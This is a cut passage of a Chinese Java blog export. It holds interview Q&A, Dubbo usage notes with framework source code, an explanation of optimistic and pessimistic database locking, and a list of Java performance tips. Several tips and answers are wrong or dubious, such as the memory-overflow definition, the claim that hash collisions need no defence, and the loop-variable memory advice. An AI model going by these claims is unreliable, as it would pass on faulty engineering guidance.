注意：实现一个单例有两点注意事项，①将构造器私有，不允许外界通过构造器创建对象；②通过公开的静态方法向外界返回类的唯一实例。这里有一个问题可以思考：Spring的IoC容器可以为普通的类创建单例，它是怎么做到的呢？ Java中的异常有哪几类？分别怎么使用？检出异常，非检出异常。检出异常需要try…catch才能编译通过。非检出异常不用try…catch也能编译通过。 RuntimeException是非检出异常，不需要try…catch也能编译通过。 IoException，SQLException等等其他所有异常都是检出异常，必须要try…catach才能编译通过。 常用的集合类有哪些？比如List如何排序？分两种，一种实现Set接口，一种是实现List接口的。 Set：TreeSet,HashSet. List:ArrayList,LinkedList,Vector(线程安全)。 JDK7以前用collections.sort(list,Comparator). JDK8直接用List.sort(Comparator). ArrayList和LinkedList内部的实现大致是怎样的？他们之间的区别和各自适应的场景是什么？ArrayList,是数组结构：少用与中间的增删。多用于查询，修改。每次增删元素顺序都会操作每个元素。 LinkedList,是链表结构：多用于中间，开头增删。少用查询，修改。查询时会遍历大量元素。 内存溢出是怎么回事？对象有被指向的引用，但是再也用不到它就是内存溢出了。 GC机制：复制回收，标记清除，引用计数（如果有循环引用后，会影响垃圾回收，所以JVM虚拟机没有采用此方法进行垃圾回收）。 ClassLoader有什么用？类加载器：所有类都需要Classloader来加载。 BoostrapClassLoader，加载系统（java包下）的类，SystemClassLoader,加载系统扩展类(少用)，AppClassloader应用类加载器，还有针对每个项目的类加载器。 ==和equals的区别？==判断对象物理地址。 equals判断对象Value是否相等。 hashCode方法的作用？在hashMap中使用，把一个对象变成一个整型。hashCode规范，如果两个对象的equals返回true，那他们的hashCode必须相等，但是hashCode相等，不一定equals不一定相等。 Object类中有哪些方法？列举3个以上。构造方法，toString()，equals，hashCode，getClass,finalize,clone,三个wait(),notify,notifyAll. NIO是什么？适用于何种场景？NIO是newIO,接口都是异步的，非阻塞的。 HashMap数据结构、扩展策略，Hash冲突攻击如何防范，如何实现线程安全的HashMap？JDK7以前：数组里面存linkedList,hash冲突，升级到JDK8。 JDK8,数组里面加集合，如果对象hashCode相同，不可比较时就是linkedList，可比较就会用TreeSet进行排序处理（红黑树先访问小的）。hash冲突不用防范。如果对象不可比较且hash冲突，我们可适当实现可比较接口。 线程安全：ConcurrentHashMap(系统自带的线程安全的HashMap),Map synchronizedMap = Collections.synchronizedMap(new HashMap&lt;&gt;()); synchronizedMap 为线程安全的Map. final/finally/finalize的区别？final是类，变量，方法的修饰。类被修饰后不能再被继承。变量和方法被修饰不能再被修改 finally是try…catch后执行的finally， finalize,在Object中的方法名，在此对象被回收前会执行这个方法。（当使用文件流时，如果对象被回收，没有关闭流，在底层就会实现内存泄露） LinkingBlockingQueue与ArrayBlockingQueue的区别，他们的适用场景？LinkingBlockQueue 链表实现的阻塞队列，适合一个一个放，一个一个取。 ArrayBlocakingQueue数组实现的阻塞队列，适合三个放，多个放，只适合多个取，不适合单个取。 Session/Cookie的区别？Session存在服务器端。 Cookie存在客户端（浏览器上）。 String/StringBuffer/StringBuilder的区别，扩展再问他们的实现？String 值不可变 StringBuffer 值可变，线程安全 StringBuilder 值可变，线程不安全 Servlet的生命周期？初始化，服务处理（接收请求，处理请求，返回结果），销毁。 如何用Java分配一段连续的1G的内存空间？需要注意些什么？ByteBuffer.allocateDirect(102410241024); Servlet 执行流程Servlet的生命周期可以分成四个阶段，即装载类及创建实例阶段、初始化阶段、服务化阶段和实例销毁阶段。 1、初始化阶段 调用init()方法 2、响应客户端请求阶段。调用Service()方法，由Service()方法根据提交的方式选择doGet()或doPost方法 3、终止阶段 调用destory()]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>JavaSE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Dobbo的注意事项]]></title>
    <url>%2F2018%2F02%2F10%2F2018-2-10-%E4%BD%BF%E7%94%A8Dobbo%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%2F</url>
    <content type="text"><![CDATA[一、前言Dubbo作为高性能RPC框架，已经进入Apache卵化器项目，虽然官方给出了dubbo使用的用户手册，但是大多是一概而过，使用dubbo时候要尽量了解源码，不然会很容易入坑。 二 、服务消费端ReferenceConfig需要自行缓存ReferenceConfig实例是个很重的实例，每个ReferenceConfig实例里面都维护了与服务注册中心的一个长链，并且维护了与所有服务提供者的的长链。假设有一个服务注册中心和N个服务提供者，那么每个ReferenceConfig实例里面维护了N+1个长链，如果频繁的生成ReferenceConfig实例，可能会造成性能问题，甚至产生内存或者连接泄露的风险。特别是使用dubbo api编程时候容易忽略这个问题。 为了解决这个问题，之前都是自行缓存，但是自从dubbo2.4.0版本后，dubbo 提供了简单的工具类 ReferenceConfigCache 用于缓存ReferenceConfig 实例。使用如下： 123456789101112//创建服务消费实例ReferenceConfig&lt;XxxService&gt; reference = new ReferenceConfig&lt;XxxService&gt;();reference.setInterface(XxxService.class);reference.setVersion("1.0.0");......//获取dubbo提供的缓存ReferenceConfigCache cache = ReferenceConfigCache.getCache();// cache.get方法中会缓存 reference对象，并且调用reference.get方法启动ReferenceConfig，并返回经过代理后的服务接口的对象XxxService xxxService = cache.get(reference);// 使用xxxService对象xxxService.sayHello(); 需要注意的是 Cache内持有ReferenceConfig对象的引用，不要在外部再调用ReferenceConfig的destroy方法了，这会导致Cache内的ReferenceConfig失效！ 如果要销毁 Cache 中的 ReferenceConfig ，将销毁 ReferenceConfig 并释放对应的资源，具体使用下面方法来销毁： 12ReferenceConfigCache cache = ReferenceConfigCache.getCache()；cache.destroy(reference); 另外以服务 Group、接口、版本为缓存的 Key，ReferenceConfig实例为对应的value。如果你需要使用自定义的key，可以在创建cache时候调用ReferenceConfigCache cache = ReferenceConfigCache.getCache(keyGenerator );方法传递自定义的keyGenerator。 三、 并发控制3.1 服务消费方并发控制在服务消费方法进行并发控制需要设置actives参数，如下： 12&lt;dubbo:reference id="userService" interface="com.test.UserServiceBo" group="dubbo" version="1.0.0" timeout="3000" actives="10"/&gt; 设置com.test.UserServiceBo接口中所有方法，每个方法最多同时并发请求10个请求。 也可以使用下面方法设置接口中的单个方法的并发请求个数，如下： 1234&lt;dubbo:reference id="userService" interface="com.test.UserServiceBo" group="dubbo" version="1.0.0" timeout="3000"&gt; &lt;dubbo:method name="sayHello" actives="10" /&gt;&lt;/dubbo:reference&gt; 如上设置sayHello方法的并发请求数量最大为10，如果客户端请求该方法并发超过了10则客户端会被阻塞，等客户端并发请求数量少于10的时候，该请求才会被发送到服务提供方服务器。在dubbo中客户端并发控制是使用ActiveLimitFilter过滤器来控制的，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class ActiveLimitFilter implements Filter &#123; public Result invoke(Invoker&lt;?&gt; invoker, Invocation invocation) throws RpcException &#123; URL url = invoker.getUrl(); String methodName = invocation.getMethodName(); //获取设置的acvites的值，默认为0 int max = invoker.getUrl().getMethodParameter(methodName, Constants.ACTIVES_KEY, 0); //获取当前方法目前并发请求数量 RpcStatus count = RpcStatus.getStatus(invoker.getUrl(), invocation.getMethodName()); if (max &gt; 0) &#123;//说明设置了actives变量 long timeout = invoker.getUrl().getMethodParameter(invocation.getMethodName(), Constants.TIMEOUT_KEY, 0); long start = System.currentTimeMillis(); long remain = timeout; int active = count.getActive(); //如果该方法并发请求数量大于设置值，则挂起当前线程。 if (active &gt;= max) &#123; synchronized (count) &#123; while ((active = count.getActive()) &gt;= max) &#123; try &#123; count.wait(remain); &#125; catch (InterruptedException e) &#123; &#125; //如果等待时间超时，则抛出异常 long elapsed = System.currentTimeMillis() - start; remain = timeout - elapsed; if (remain &lt;= 0) &#123; throw new RpcException("Waiting concurrent invoke timeout in client-side for service: " + invoker.getInterface().getName() + ", method: " + invocation.getMethodName() + ", elapsed: " + elapsed + ", timeout: " + timeout + ". concurrent invokes: " + active + ". max concurrent invoke limit: " + max); &#125; &#125; &#125; &#125; &#125; //没有限流时候，正常调用 try &#123; long begin = System.currentTimeMillis(); RpcStatus.beginCount(url, methodName); try &#123; Result result = invoker.invoke(invocation); RpcStatus.endCount(url, methodName, System.currentTimeMillis() - begin, true); return result; &#125; catch (RuntimeException t) &#123; RpcStatus.endCount(url, methodName, System.currentTimeMillis() - begin, false); throw t; &#125; &#125; finally &#123; if (max &gt; 0) &#123; synchronized (count) &#123; count.notify(); &#125; &#125; &#125; &#125;&#125; 可知客户端并发控制，是如果当并发量达到指定值后，当前客户端请求线程会被挂起，如果在等待超时期间并发请求量少了，那么阻塞的线程会被激活，然后发送请求到服务提供方，如果等待超时了，则直接抛出异常，这时候服务根本都没有发送到服务提供方服务器。 四、 改进的广播策略前面我们讲解集群容错时候谈到有一个广播策略，该策略主要用于对所有服务提供者进行广播消息，那么有个问题需要思考，广播是是说你在客户端调用接口一次，内部就是轮询调用所有服务提供者的机器的服务，那么你调用一次该接口，返回值是什么那？比如内部轮询了10台机器，每个机器应该都有一个返回值，那么你调用的这一次返回值是10个返回值的组成？其实不是，返回的是轮询调用的最后一个机器结果，那么如果我们想把所有的机器返回的结果聚合起来如何做的？ 使用dubbo中更多需要注意的事情 单击我查看文章 ， 单击我观看视频即可知晓。]]></content>
      <categories>
        <category>分布式架构</category>
      </categories>
      <tags>
        <tag>Dobbo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解乐观锁与悲观锁]]></title>
    <url>%2F2018%2F02%2F10%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E4%B9%90%E8%A7%82%E9%94%81%E4%B8%8E%E6%82%B2%E8%A7%82%E9%94%81%2F</url>
    <content type="text"><![CDATA[数据库管理系统（DBMS）中的并发控制的任务是确保在多个事务同时存取数据库中同一数据时不破坏事务的隔离性和统一性以及数据库的统一性。 乐观并发控制(乐观锁)和悲观并发控制（悲观锁）是并发控制主要采用的技术手段。 无论是悲观锁还是乐观锁，都是人们定义出来的概念，可以认为是一种思想。其实不仅仅是关系型数据库系统中有乐观锁和悲观锁的概念，像memcache、hibernate、tair等都有类似的概念。 针对于不同的业务场景，应该选用不同的并发控制方式。所以，不要把乐观并发控制和悲观并发控制狭义的理解为DBMS中的概念，更不要把他们和数据中提供的锁机制（行锁、表锁、排他锁、共享锁）混为一谈。其实，在DBMS中，悲观锁正是利用数据库本身提供的锁机制来实现的。 下面来分别学习一下悲观锁和乐观锁。 悲观锁 在关系数据库管理系统里，悲观并发控制（又名“悲观锁”，Pessimistic Concurrency Control，缩写“PCC”）是一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作都某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。悲观并发控制主要用于数据争用激烈的环境，以及发生并发冲突时使用锁保护数据的成本要低于回滚事务的成本的环境中。 悲观锁，正如其名，它指的是对数据被外界（包括本系统当前的其他事务，以及来自外部系统的事务处理）修改持保守态度(悲观)，因此，在整个数据处理过程中，将数据处于锁定状态。 悲观锁的实现，往往依靠数据库提供的锁机制 （也只有数据库层提供的锁机制才能真正保证数据访问的排他性，否则，即使在本系统中实现了加锁机制，也无法保证外部系统不会修改数据） 在数据库中，悲观锁的流程如下： 在对任意记录进行修改前，先尝试为该记录加上排他锁（exclusive locking）。 如果加锁失败，说明该记录正在被修改，那么当前查询可能要等待或者抛出异常。 具体响应方式由开发者根据实际需要决定。 如果成功加锁，那么就可以对记录做修改，事务完成后就会解锁了。 其间如果有其他对该记录做修改或加排他锁的操作，都会等待我们解锁或直接抛出异常。 MySQL InnoDB中使用悲观锁 要使用悲观锁，我们必须关闭mysql数据库的自动提交属性，因为MySQL默认使用autocommit模式，也就是说，当你执行一个更新操作后，MySQL会立刻将结果进行提交。set autocommit=0; 12345678910//0.开始事务begin;/begin work;/start transaction; (三者选一就可以)//1.查询出商品信息select status from t_goods where id=1 for update;//2.根据商品信息生成订单insert into t_orders (id,goods_id) values (null,1);//3.修改商品status为2update t_goods set status=2;//4.提交事务commit;/commit work; 上面的查询语句中，我们使用了select…for update的方式，这样就通过开启排他锁的方式实现了悲观锁。此时在t_goods表中，id为1的 那条数据就被我们锁定了，其它的事务必须等本次事务提交之后才能执行。这样我们可以保证当前的数据不会被其它事务修改。 上面我们提到，使用select…for update会把数据给锁住，不过我们需要注意一些锁的级别，MySQL InnoDB默认行级锁。行级锁都是基于索引的，如果一条SQL语句用不到索引是不会使用行级锁的，会使用表级锁把整张表锁住，这点需要注意。 优点与不足悲观并发控制实际上是“先取锁再访问”的保守策略，为数据处理的安全提供了保证。但是在效率方面，处理加锁的机制会让数据库产生额外的开销，还有增加产生死锁的机会；另外，在只读型事务处理中由于不会产生冲突，也没必要使用锁，这样做只能增加系统负载；还有会降低了并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数 乐观锁 在关系数据库管理系统里，乐观并发控制（又名“乐观锁”，Optimistic Concurrency Control，缩写“OCC”）是一种并发控制的方法。它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。乐观事务控制最早是由孔祥重（H.T.Kung）教授提出。 乐观锁（ Optimistic Locking ） 相对悲观锁而言，乐观锁假设认为数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发现冲突了，则让返回用户错误的信息，让用户决定如何去做。 相对于悲观锁，在对数据库进行处理的时候，乐观锁并不会使用数据库提供的锁机制。一般的实现乐观锁的方式就是记录数据版本。 数据版本,为数据增加的一个版本标识。当读取数据时，将版本标识的值一同读出，数据每更新一次，同时对版本标识进行更新。当我们提交更新的时候，判断数据库表对应记录的当前版本信息与第一次取出来的版本标识进行比对，如果数据库表当前版本号与第一次取出来的版本标识值相等，则予以更新，否则认为是过期数据。 实现数据版本有两种方式，第一种是使用版本号，第二种是使用时间戳。 使用版本号实现乐观锁使用版本号时，可以在数据初始化时指定一个版本号，每次对数据的更新操作都对版本号执行+1操作。并判断当前版本号是不是该数据的最新的版本号。 12345671.查询出商品信息select (status,status,version) from t_goods where id=#&#123;id&#125;2.根据商品信息生成订单3.修改商品status为2update t_goods set status=2,version=version+1where id=#&#123;id&#125; and version=#&#123;version&#125;; 优点与不足乐观并发控制相信事务之间的数据竞争(data race)的概率是比较小的，因此尽可能直接做下去，直到提交的时候才去锁定，所以不会产生任何锁和死锁。但如果直接简单这么做，还是有可能会遇到不可预期的结果，例如两个事务都读取了数据库的某一行，经过修改以后写回数据库，这时就遇到了问题。]]></content>
      <categories>
        <category>MySql</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 代码性能优化总结]]></title>
    <url>%2F2018%2F01%2F29%2F2018-1-29-Java-%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[代 码优化，一个很重要的课题。可能有些人觉得没用，一些细小的地方有什么好修改的，改与不改对于代码的运 行效率有什么影响呢？这个问题我是这么考虑的，就像 大海里面的鲸鱼一样，它吃一条小虾米有用吗？没用，但 是，吃的小虾米一多之后，鲸鱼就被喂饱了。代码优化也是一样，如果项目着眼于尽快无BUG上线，那么 此时可 以抓大放小，代码的细节可以不精打细磨；但是如果有足够的时间开发、维护代码，这时候就必须考虑每个可以优 化的细节了，一个一个细小的优化点累积起 来，对于代码的运行效率绝对是有提升的。 代码优化的目标是： 1、减小代码的体积 2、提高代码运行的效率 本文的内容有些来自网络，有些来自平时工作和学习，当然这不重要，重要的是这些代码优化的细节是否真真正正地有用。那本文会保持长期更新，只要有遇到值得分享的代码优化细节，就会不定时地更新此文。 代码优化细节 1、尽量指定类、方法的final修饰符 带 有final修饰符的类是不可派生的。在Java核心API中，有许多应用final的例子，例如java.lang.String，整个类 都是 final的。为类指定final修饰符可以让类不可以被继承，为方法指定final修饰符可以让方法不可以被重写。如 果指定了一个类为final，则该 类所有的方法都是final的。Java编译器会寻找机会内联所有的final方法，内联对于 提升Java运行效率作用重大，具体参见Java运行期优 化。此举能够使性能平均提高50%。 2、尽量重用对象 特别是String对象的使用，出现字符串连接时应该使用StringBuilder/StringBuffer代替。由于Java虚拟机不仅要花 时间生成对象，以后可能还需要花时间对这些对象进行垃圾回收和处理，因此，生成过多的对象将会给程序的性能 带来很大的影响。 3、尽可能使用局部变量 调用方法时传递的参数以及在调用中创建的临时变量都保存在栈中速度较快，其他变量，如静态变量、实例变量 等，都在堆中创建，速度较慢。另外，栈中创建的变量，随着方法的运行结束，这些内容就没了，不需要额外的垃 圾回收。 4、及时关闭流 Java编程过程中，进行数据库连接、I/O流操作时务必小心，在使用完毕后，及时关闭以释放资源。因为对这些大 对象的操作会造成系统大的开销，稍有不慎，将会导致严重的后果。 5、尽量减少对变量的重复计算 明确一个概念，对方法的调用，即使方法中只有一句语句，也是有消耗的，包括创建栈帧、调用方法时保护现 场、调用方法完毕时恢复现场等。所以例如下面的操作： for (int i = 0; i &lt; list.size(); i++) {…} 建议替换为： for (int i = 0, int length = list.size(); i &lt; length; i++) {…} 这样，在list.size()很大的时候，就减少了很多的消耗 6、尽量采用懒加载的策略，即在需要的时候才创建 例如： String str = “aaa”; if (i == 1) { list.add(str); } 建议替换为： if (i == 1) { String str = “aaa”; list.add(str); } 7、慎用异常 异 常对性能不利。抛出异常首先要创建一个新的对象，Throwable接口的构造函数调用名为fillInStackTrace()的本 地同步方 法，fillInStackTrace()方法检查堆栈，收集调用跟踪信息。只要有异常被抛出，Java虚拟机就必须调整调 用堆栈，因为在处理过程中创建 了一个新的对象。异常只能用于错误处理，不应该用来控制程序流程。 8、不要在循环中使用try…catch…，应该把其放在最外层 根据网友们提出的意见，这一点我认为值得商榷 9、如果能估计到待添加的内容长度，为底层以数组方式实现的集合、工具类指定初始长度 比如ArrayList、LinkedLlist、StringBuilder、StringBuffer、HashMap、 HashSet等等，以StringBuilder为例： （1）StringBuilder() // 默认分配16个字符的空间 （2）StringBuilder(int size) // 默认分配size个字符的空间 （3）StringBuilder(String str) // 默认分配16个字符+str.length()个字符空间 可 以通过类（这里指的不仅仅是上面的StringBuilder）的构造函数来设定它的初始化容量，这样可以明显地提升 性能。比如 StringBuilder吧，length表示当前的StringBuilder能保持的字符数量。因为当StringBuilder达到最大 容量的时 候，它会将自身容量增加到当前的2倍再加2，无论何时只要StringBuilder达到它的最大容量，它就不得 不创建一个新的字符数组然后将旧的字符数 组内容拷贝到新字符数组中—-这是十分耗费性能的一个操作。试想， 如果能预估到字符数组中大概要存放5000个字符而不指定长度，最接近5000的2 次幂是4096，每次扩容加的2不 管，那么： （1）在4096 的基础上，再申请8194个大小的字符数组，加起来相当于一次申请了12290个大小的字符数组，如果一开始能指定5000个大小的字符数组，就节省了一倍以上的空间 （2）把原来的4096个字符拷贝到新的的字符数组中去 这 样，既浪费内存空间又降低代码运行效率。所以，给底层以数组实现的集合、工具类设置一个合理的初始化容 量是错不了的，这会带来立竿见影的效果。但是，注 意，像HashMap这种是以数组+链表实现的集合，别把初始 大小和你估计的大小设置得一样，因为一个table上只连接一个对象的可能性几乎为0。初始 大小建议设置为2的N 次幂，如果能估计到有2000个元素，设置成new HashMap(128)、new HashMap(256)都可以。 10、当复制大量数据时，使用System.arraycopy()命令 11、乘法和除法使用移位操作 例如： for (val = 0; val &lt; 100000; val += 5) { a = val * 8; b = val / 2; } 用移位操作可以极大地提高性能，因为在计算机底层，对位的操作是最方便、最快的，因此建议修改为： for (val = 0; val &lt; 100000; val += 5) { a = val &lt;&lt; 3; b = val &gt;&gt; 1; } 移位操作虽然快，但是可能会使代码不太好理解，因此最好加上相应的注释。 12、循环内不要不断创建对象引用 例如： for (int i = 1; i &lt;= count; i++) { ​ Object obj = new Object(); } 这种做法会导致内存中有count份Object对象引用存在，count很大的话，就耗费内存了，建议为改为： Object obj = null; for (int i = 0; i &lt;= count; i++) { ​ obj = new Object(); } 这样的话，内存中只有一份Object对象引用，每次new Object()的时候，Object对象引用指向不同的Object罢 了，但是内存中只有一份，这样就大大节省了内存空间了。 13、基于效率和类型检查的考虑，应该尽可能使用array，无法确定数组大小时才使用ArrayList 14、尽量使用HashMap、ArrayList、StringBuilder，除非线程安全需要，否则不推荐使用Hashtable、 Vector、StringBuffer，后三者由于使用同步机制而导致了性能开销 15、不要将数组声明为public static final 因为这毫无意义，这样只是定义了引用为static final，数组的内容还是可以随意改变的，将数组声明为public更是 一个安全漏洞，这意味着这个数组可以被外部类所改变 16、尽量在合适的场合使用单例 使用单例可以减轻加载的负担、缩短加载的时间、提高加载的效率，但并不是所有地方都适用于单例，简单来 说，单例主要适用于以下三个方面： （1）控制资源的使用，通过线程同步来控制资源的并发访问 （2）控制实例的产生，以达到节约资源的目的 （3）控制数据的共享，在不建立直接关联的条件下，让多个不相关的进程或线程之间实现通信 17、尽量避免随意使用静态变量 要知道，当某个对象被定义为static的变量所引用，那么gc通常是不会回收这个对象所占有的堆内存的，如： public class A { ​ private static B b = new B(); } 此时静态变量b的生命周期与A类相同，如果A类不被卸载，那么引用B指向的B对象会常驻内存，直到程序终止 18、及时清除不再需要的会话 为 了清除不再活动的会话，许多应用服务器都有默认的会话超时时间，一般为30分钟。当应用服务器需要保存更 多的会话时，如果内存不足，那么操作系统会把部分 数据转移到磁盘，应用服务器也可能根据MRU（最近最频繁 使用）算法把部分不活跃的会话转储到磁盘，甚至可能抛出内存不足的异常。如果会话要被转储到磁 盘，那么必 须要先被序列化，在大规模集群中，对对象进行序列化的代价是很昂贵的。因此，当会话不再需要时，应当及时调 用HttpSession的 invalidate()方法清除会话。 19、实现RandomAccess接口的集合比如ArrayList，应当使用最普通的for循环而不是foreach循环来遍历 这 是JDK推荐给用户的。JDK API对于RandomAccess接口的解释是：实现RandomAccess接口用来表明其支持快 速随机访问，此接口的主要目的是允许一般的算法更改 其行为，从而将其应用到随机或连续访问列表时能提供良 好的性能。实际经验表明，实现RandomAccess接口的类实例，假如是随机访问的，使用普通 for循环效率将高于 使用foreach循环；反过来，如果是顺序访问的，则使用Iterator会效率更高。可以使用类似如下的代码作判断： if (list instanceof RandomAccess) { ​ for (int i = 0; i &lt; list.size(); i++){} } else { ​ Iterator&lt;?&gt; iterator = list.iterable(); ​ while (iterator.hasNext()){iterator.next()} } foreach循环的底层实现原理就是迭代器Iterator，参见Java语法糖1：可变长度参数以及foreach循环原理。所以 后半句”反过来，如果是顺序访问的，则使用Iterator会效率更高”的意思就是顺序访问的那些类实例，使用foreach 循环去遍历。 20、使用同步代码块替代同步方法 这点在多线程模块中的synchronized锁方法块一文中已经讲得很清楚了，除非能确定一整个方法都是需要进行同 步的，否则尽量使用同步代码块，避免对那些不需要进行同步的代码也进行了同步，影响了代码执行效率。 21、将常量声明为static final，并以大写命名 这样在编译期间就可以把这些内容放入常量池中，避免运行期间计算生成常量的值。另外，将常量的名字以大写 命名也可以方便区分出常量与变量 22、不要创建一些不使用的对象，不要导入一些不使用的类 这毫无意义，如果代码中出现”The value of the local variable i is not used”、”The import java.util is never used”，那么请删除这些无用的内容 23、程序运行过程中避免使用反射 关 于，请参见反射。反射是Java提供给用户一个很强大的功能，功能强大往往意味着效率不高。不建议在程序运 行过程中使用尤其是频繁使用反射机制，特别是 Method的invoke方法，如果确实有必要，一种建议性的做法是将 那些需要通过反射加载的类在项目启动的时候通过反射实例化出一个对象并放入内存 —-用户只关心和对端交互的 时候获取最快的响应速度，并不关心对端的项目启动花多久时间。 24、使用数据库连接池和线程池 这两个池都是用于重用对象的，前者可以避免频繁地打开和关闭连接，后者可以避免频繁地创建和销毁线程 25、使用带缓冲的输入输出流进行IO操作 带缓冲的输入输出流，即BufferedReader、BufferedWriter、BufferedInputStream、 BufferedOutputStream，这可以极大地提升IO效率 26、顺序插入和随机访问比较多的场景使用ArrayList，元素删除和中间插入比较多的场景使用LinkedList 这个，理解ArrayList和LinkedList的原理就知道了 27、不要让public方法中有太多的形参 public方法即对外提供的方法，如果给这些方法太多形参的话主要有两点坏处： 1、违反了面向对象的编程思想，Java讲求一切都是对象，太多的形参，和面向对象的编程思想并不契合 2、参数太多势必导致方法调用的出错概率增加 至于这个”太多”指的是多少个，3、4个吧。比如我们用JDBC写一个insertStudentInfo方法，有10个学生信息字段 要插如Student表中，可以把这10个参数封装在一个实体类中，作为insert方法的形参 28、字符串变量和字符串常量equals的时候将字符串常量写在前面 这是一个比较常见的小技巧了，如果有以下代码： String str = “123”; if (str.equals(“123”)) { ​ … } 建议修改为： String str = “123”; if (“123”.equals(str)) { ​ … } 这么做主要是可以避免空指针异常 29、请知道，在java中if (i == 1)和if (1 == i)是没有区别的，但从阅读习惯上讲，建议使用前者 平时有人问，”if (i == 1)”和”if (1== i)”有没有区别，这就要从C/C++讲起。 在C/C++中，”if (i == 1)”判断条件成立，是以0与非0为基准的，0表示false，非0表示true，如果有这么一段代码： int i = 2; if (i == 1) { ​ … } else { ​ … } C/C++判断”i==1”不成立，所以以0表示，即false。但是如果： int i = 2; if (i = 1) { ​ … } else { ​ … } 万 一程序员一个不小心，把”if (i == 1)”写成”if (i = 1)”，这样就有问题了。在if之内将i赋值为1，if判断里面的内容非0，返回的就是true了，但是明明i为2，比较的值是1，应该返回的 false。这种情况在C/C++的开发中是很可能发生的并且会导致一些难以理解的错误产生，所以，为了避免开发者在if语句中不正确的赋值操作，建议将 if语句写为： int i = 2; if (1 == i) { ​ … } else { ​ … } 这样，即使开发者不小心写成了”1 = i”，C/C++编译器也可以第一时间检查出来，因为我们可以对一个变量赋值i为 1，但是不能对一个常量赋值1为i。 但 是，在Java中，C/C++这种”if (i = 1)”的语法是不可能出现的，因为一旦写了这种语法，Java就会编译报错”Type mismatch: cannot convert from int to boolean”。但是，尽管Java的”if (i == 1)”和”if (1 == i)”在语义上没有任何 区别，但是从阅读习惯上讲，建议使用前者会更好些。 30、不要对数组使用toString()方法 看一下对数组使用toString()打印出来的是什么： public static void main(String[] args) { ​ int[] is = new int[]{1, 2, 3}; ​ System.out.println(is.toString()); } 结果是： [I@18a992f 本 意是想打印出数组内容，却有可能因为数组引用is为空而导致空指针异常。不过虽然对数组toString()没有意 义，但是对集合toString()是 可以打印出集合里面的内容的，因为集合的父类AbstractCollections重写了 Object的toString()方法。 32、不要对超出范围的基本数据类型做向下强制转型 这绝不会得到想要的结果： public static void main(String[] args) { ​ long l = 12345678901234L; ​ int i = (int)l; ​ System.out.println(i); } 我们可能期望得到其中的某几位，但是结果却是： 1942892530 解释一下。Java中long是8个字节64位的，所以12345678901234在计算机中的表示应该是： 0000 0000 0000 0000 0000 1011 0011 1010 0111 0011 1100 1110 0010 1111 1111 0010 一个int型数据是4个字节32位的，从低位取出上面这串二进制数据的前32位是： 0111 0011 1100 1110 0010 1111 1111 0010 这串二进制表示为十进制1942892530，所以就是我们上面的控制台上输出的内容。从这个例子上还能顺便得到两个结论： 1、 整型默认的数据类型是int，long l = 12345678901234L，这个数字已经超出了int的范围了，所以最后有一个 L，表示这是一个long型数。顺便，浮点型的默认类型是 double，所以定义float的时候要写成””float f = 3.5f” 2、接下来再写一句”int ii = l + i;”会报错，因为long + int是一个long，不能赋值给int 33、公用的集合类中不使用的数据一定要及时remove掉 如果一个集合类是公用的（也就是说不是方法里面的属性），那么这个集合里面的元素是不会自动释放的，因为 始终有引用指向它们。所以，如果公用集合里面的某些数据不使用而不去remove掉它们，那么将会造成这个公用 集合不断增大，使得系统有内存泄露的隐患。 34、把一个基本数据类型转为字符串，基本数据类型.toString()是最快的方式、String.valueOf(数据)次之、 数据+””最慢 把一个基本数据类型转为一般有三种方式，我有一个Integer型数据i，可以使用i.toString()、String.valueOf(i)、 i+””三种方式，三种方式的效率如何，看一个测试： public static void main(String[] args) { ​ int loopTime = 50000; ​ Integer i = 0; ​ long startTime = System.currentTimeMillis(); ​ for (int j = 0; j &lt; loopTime; j++) ​ { ​ String str = String.valueOf(i); ​ } ​ System.out.println(“String.valueOf()：” + (System.currentTimeMillis() - startTime) + “ms”); ​ startTime = System.currentTimeMillis(); ​ for (int j = 0; j &lt; loopTime; j++) ​ { ​ String str = i.toString(); ​ } ​ System.out.println(“Integer.toString()：” + (System.currentTimeMillis() - startTime) + “ms”); ​ startTime = System.currentTimeMillis(); ​ for (int j = 0; j &lt; loopTime; j++) ​ { ​ String str = i + “”; ​ } ​ System.out.println(“i + “”：” + (System.currentTimeMillis() - startTime) + “ms”); } 运行结果为： String.valueOf()：11ms Integer.toString()：5ms i + “”：25ms 所以以后遇到把一个基本数据类型转为String的时候，优先考虑使用toString()方法。至于为什么，很简单： 1、String.valueOf()方法底层调用了Integer.toString()方法，但是会在调用前做空判断 2、Integer.toString()方法就不说了，直接调用了 3、i + “”底层使用了StringBuilder实现，先用append方法拼接，再用toString()方法获取字符串 三者对比下来，明显是2最快、1次之、3最慢 35、使用最有效率的方式去遍历Map 遍历Map的方式有很多，通常场景下我们需要的是遍历Map中的Key和Value，那么推荐使用的、效率最高的方式是： public static void main(String[] args) { ​ HashMap&lt;String, String&gt; hm = new HashMap&lt;String, String&gt;(); ​ hm.put(“111”, “222”); ​ ​ Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = hm.entrySet(); ​ Iterator&lt;Map.Entry&lt;String, String&gt;&gt; iter = entrySet.iterator(); ​ while (iter.hasNext()) ​ { ​ Map.Entry&lt;String, String&gt; entry = iter.next(); ​ System.out.println(entry.getKey() + “” + entry.getValue()); ​ } } 如果你只是想遍历一下这个Map的key值，那用”Set keySet = hm.keySet();”会比较合适一些 36、对资源的close()建议分开操作 意思是，比如我有这么一段代码： try { ​ XXX.close(); ​ YYY.close(); } catch 